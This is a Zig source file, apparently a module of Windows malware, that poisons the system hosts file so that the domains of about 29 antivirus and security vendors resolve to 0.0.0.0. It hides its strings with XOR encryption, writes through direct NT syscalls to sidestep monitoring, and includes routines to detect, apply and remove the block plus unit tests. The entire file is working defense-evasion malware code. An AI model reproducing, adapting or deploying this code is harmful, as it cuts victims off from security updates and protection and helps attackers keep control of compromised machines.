const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const file_io = @import("../parsers/file_io.zig");

const FILE_GENERIC_WRITE: types.ULONG = 0x40000000;
const FILE_SHARE_READ: types.ULONG = 0x00000001;
const FILE_SHARE_WRITE: types.ULONG = 0x00000002;
const FILE_OPEN_IF: types.ULONG = 0x00000003;
const FILE_OVERWRITE_IF: types.ULONG = 0x00000005;
const FILE_NON_DIRECTORY_FILE: types.ULONG = 0x00000040;
const FILE_SYNCHRONOUS_IO_NONALERT: types.ULONG = 0x00000020;
const OBJ_CASE_INSENSITIVE: types.ULONG = 0x00000040;

const E = struct {
    pub const hosts_path = hash.xorEncrypt("C:\\Windows\\System32\\drivers\\etc\\hosts");
    pub const header = hash.xorEncrypt("# Mirage AV Block List\r\n");
    pub const footer = hash.xorEncrypt("# End Mirage AV Block List\r\n");

    pub const e0 = hash.xorEncrypt("0.0.0.0 microsoft.com\r\n0.0.0.0 *.microsoft.com\r\n");
    pub const e1 = hash.xorEncrypt("0.0.0.0 kaspersky.com\r\n0.0.0.0 *.kaspersky.com\r\n");
    pub const e2 = hash.xorEncrypt("0.0.0.0 eset.com\r\n0.0.0.0 *.eset.com\r\n");
    pub const e3 = hash.xorEncrypt("0.0.0.0 drweb.com\r\n0.0.0.0 *.drweb.com\r\n");
    pub const e4 = hash.xorEncrypt("0.0.0.0 avast.com\r\n0.0.0.0 *.avast.com\r\n");
    pub const e5 = hash.xorEncrypt("0.0.0.0 avg.com\r\n0.0.0.0 *.avg.com\r\n");
    pub const e6 = hash.xorEncrypt("0.0.0.0 bitdefender.com\r\n0.0.0.0 *.bitdefender.com\r\n");
    pub const e7 = hash.xorEncrypt("0.0.0.0 malwarebytes.com\r\n0.0.0.0 *.malwarebytes.com\r\n");
    pub const e8 = hash.xorEncrypt("0.0.0.0 crowdstrike.com\r\n0.0.0.0 *.crowdstrike.com\r\n");
    pub const e9 = hash.xorEncrypt("0.0.0.0 sentinelone.com\r\n0.0.0.0 *.sentinelone.com\r\n");
    pub const e10 = hash.xorEncrypt("0.0.0.0 trendmicro.com\r\n0.0.0.0 *.trendmicro.com\r\n");
    pub const e11 = hash.xorEncrypt("0.0.0.0 mcafee.com\r\n0.0.0.0 *.mcafee.com\r\n");
    pub const e12 = hash.xorEncrypt("0.0.0.0 sophos.com\r\n0.0.0.0 *.sophos.com\r\n");
    pub const e13 = hash.xorEncrypt("0.0.0.0 norton.com\r\n0.0.0.0 *.norton.com\r\n");
    pub const e14 = hash.xorEncrypt("0.0.0.0 panda.com\r\n0.0.0.0 *.panda.com\r\n");
    pub const e15 = hash.xorEncrypt("0.0.0.0 f-secure.com\r\n0.0.0.0 *.f-secure.com\r\n");
    pub const e16 = hash.xorEncrypt("0.0.0.0 comodo.com\r\n0.0.0.0 *.comodo.com\r\n");
    pub const e17 = hash.xorEncrypt("0.0.0.0 checkpoint.com\r\n0.0.0.0 *.checkpoint.com\r\n");
    pub const e18 = hash.xorEncrypt("0.0.0.0 fortinet.com\r\n0.0.0.0 *.fortinet.com\r\n");
    pub const e19 = hash.xorEncrypt("0.0.0.0 paloaltonetworks.com\r\n0.0.0.0 *.paloaltonetworks.com\r\n");
    pub const e20 = hash.xorEncrypt("0.0.0.0 broadcom.com\r\n0.0.0.0 *.broadcom.com\r\n");
    pub const e21 = hash.xorEncrypt("0.0.0.0 vmware.com\r\n0.0.0.0 *.vmware.com\r\n");
    pub const e22 = hash.xorEncrypt("0.0.0.0 carbonblack.com\r\n0.0.0.0 *.carbonblack.com\r\n");
    pub const e23 = hash.xorEncrypt("0.0.0.0 cylance.com\r\n0.0.0.0 *.cylance.com\r\n");
    pub const e24 = hash.xorEncrypt("0.0.0.0 fireeye.com\r\n0.0.0.0 *.fireeye.com\r\n");
    pub const e25 = hash.xorEncrypt("0.0.0.0 zonelabs.com\r\n0.0.0.0 *.zonelabs.com\r\n");
    pub const e26 = hash.xorEncrypt("0.0.0.0 gdata.com\r\n0.0.0.0 *.gdata.com\r\n");
    pub const e27 = hash.xorEncrypt("0.0.0.0 ahnlab.com\r\n0.0.0.0 *.ahnlab.com\r\n");
    pub const e28 = hash.xorEncrypt("0.0.0.0 symantec.com\r\n0.0.0.0 *.symantec.com\r\n");

    pub const entries = [_][]const u8{
        @as([]const u8, &e0),  @as([]const u8, &e1),  @as([]const u8, &e2),
        @as([]const u8, &e3),  @as([]const u8, &e4),  @as([]const u8, &e5),
        @as([]const u8, &e6),  @as([]const u8, &e7),  @as([]const u8, &e8),
        @as([]const u8, &e9),  @as([]const u8, &e10), @as([]const u8, &e11),
        @as([]const u8, &e12), @as([]const u8, &e13), @as([]const u8, &e14),
        @as([]const u8, &e15), @as([]const u8, &e16), @as([]const u8, &e17),
        @as([]const u8, &e18), @as([]const u8, &e19), @as([]const u8, &e20),
        @as([]const u8, &e21), @as([]const u8, &e22), @as([]const u8, &e23),
        @as([]const u8, &e24), @as([]const u8, &e25), @as([]const u8, &e26),
        @as([]const u8, &e27), @as([]const u8, &e28),
    };
};

fn openHostsForWrite(h: *types.HANDLE) bool {
    var path_buf: [E.hosts_path.len]u8 = undefined;
    hash.xorDecrypt(&E.hosts_path, &path_buf);
    var us_buf: [512]u16 = undefined;
    for (path_buf, 0..) |c, i| {
        if (i >= 511) break;
        us_buf[i] = c;
    }
    var us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(path_buf.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(us_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&us_buf)),
    };
    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    var iosb: types.IO_STATUS_BLOCK = undefined;
    return engine.NtCreateFile(h, FILE_GENERIC_WRITE, @as(types.PVOID, @ptrCast(&oa)), @as(types.PVOID, @ptrCast(&iosb)), null, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, null, 0) >= 0;
}

fn openHostsForAppend(h: *types.HANDLE) bool {
    var path_buf: [E.hosts_path.len]u8 = undefined;
    hash.xorDecrypt(&E.hosts_path, &path_buf);
    var us_buf: [512]u16 = undefined;
    for (path_buf, 0..) |c, i| {
        if (i >= 511) break;
        us_buf[i] = c;
    }
    var us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(path_buf.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(us_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&us_buf)),
    };
    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    var iosb: types.IO_STATUS_BLOCK = undefined;
    return engine.NtCreateFile(h, FILE_GENERIC_WRITE, @as(types.PVOID, @ptrCast(&oa)), @as(types.PVOID, @ptrCast(&iosb)), null, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, null, 0) >= 0;
}

fn writeToFile(h: types.HANDLE, data: []const u8) bool {
    var iosb: types.IO_STATUS_BLOCK = undefined;
    var dummy_event: u8 = 0;
    const ev: types.HANDLE = @ptrCast(&dummy_event);
    const status = engine.NtWriteFile(h, ev, null, null, @as(types.PVOID, @ptrCast(&iosb)), @as(types.PVOID, @ptrCast(@constCast(data.ptr))), @as(types.ULONG, @intCast(data.len)), null, null);
    return status >= 0;
}

pub fn isPoisoned() bool {
    var path_buf: [E.hosts_path.len]u8 = undefined;
    hash.xorDecrypt(&E.hosts_path, &path_buf);
    const mf = file_io.MappedFile.open(path_buf[0..]) orelse return false;
    defer mf.close();

    var hdr_buf: [E.header.len]u8 = undefined;
    hash.xorDecrypt(&E.header, &hdr_buf);
    return std.mem.indexOf(u8, mf.slice(), hdr_buf[0..]) != null;
}

pub fn poison(count: *u32) bool {
    if (isPoisoned()) {
        count.* = 0;
        return false;
    }

    var h: types.HANDLE = undefined;
    if (!openHostsForAppend(&h)) {
        count.* = 0;
        return false;
    }
    defer _ = engine.NtClose(h);

    var hdr: [E.header.len]u8 = undefined;
    hash.xorDecrypt(&E.header, &hdr);
    if (!writeToFile(h, hdr[0..])) return false;

    var added: u32 = 0;
    for (&E.entries) |enc_entry| {
        var tmp: [enc_entry.len]u8 = undefined;
        hash.xorDecrypt(enc_entry, &tmp);
        if (!writeToFile(h, tmp[0..])) continue;
        added += 2;
    }

    var ftr: [E.footer.len]u8 = undefined;
    hash.xorDecrypt(&E.footer, &ftr);
    _ = writeToFile(h, ftr[0..]);

    count.* = added;
    return added > 0;
}

pub fn clean() void {
    var path_buf: [E.hosts_path.len]u8 = undefined;
    hash.xorDecrypt(&E.hosts_path, &path_buf);

    const mf = file_io.MappedFile.open(path_buf[0..]) orelse return;
    defer mf.close();
    const content = mf.slice();

    var hdr_buf: [E.header.len]u8 = undefined;
    var ftr_buf: [E.footer.len]u8 = undefined;
    hash.xorDecrypt(&E.header, &hdr_buf);
    hash.xorDecrypt(&E.footer, &ftr_buf);

    const start = std.mem.indexOf(u8, content, hdr_buf[0..]) orelse return;
    const end = std.mem.indexOf(u8, content[start..], ftr_buf[0..]) orelse return;
    const end_pos = start + end + ftr_buf.len;

    var remaining = std.ArrayList(u8).initCapacity(std.heap.page_allocator, content.len) catch return;
    defer remaining.deinit(std.heap.page_allocator);
    if (start > 0) remaining.appendSlice(std.heap.page_allocator, content[0..start]) catch {};
    if (end_pos < content.len) remaining.appendSlice(std.heap.page_allocator, content[end_pos..]) catch {};
    if (remaining.items.len == content.len) return;

    var wh: types.HANDLE = undefined;
    if (!openHostsForWrite(&wh)) return;
    defer _ = engine.NtClose(wh);

    _ = writeToFile(wh, remaining.items);
}

test "hosts_poison: isPoisoned returns false" {
    try std.testing.expect(!isPoisoned());
}

test "hosts_poison: clean no crash" {
    clean();
}

test "hosts_poison: decrypt header works" {
    var buf: [E.header.len]u8 = undefined;
    hash.xorDecrypt(&E.header, &buf);
    try std.testing.expect(buf.len > 0);
    try std.testing.expect(std.mem.indexOf(u8, buf[0..], "Mirage") != null);
}

test "hosts_poison: entries count" {
    try std.testing.expectEqual(@as(usize, 29), E.entries.len);
}
